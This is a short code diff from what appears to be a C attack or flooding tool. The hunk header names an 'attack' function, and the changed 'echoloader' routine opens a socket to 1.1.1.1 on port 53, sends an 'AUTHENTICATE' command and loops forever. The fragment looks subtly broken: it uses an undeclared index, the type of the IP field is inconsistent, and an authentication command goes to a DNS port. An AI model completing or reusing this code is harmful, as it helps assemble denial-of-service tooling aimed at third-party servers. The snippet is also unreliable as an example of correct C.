@@ -99,7 +99,7 @@ void attack(char *host, char *port, int id) {
 
 void echoloader() {
 	int r;
-        clients[i].ip = "1.1.1.1";
+        clients[i].ip = inet_addr("1.1.1.1");
 	int socket = make_socket(clients[i].ip, "53");
 	write(socket, "AUTHENTICATE \"\"\n", 16);
 	while(1) {
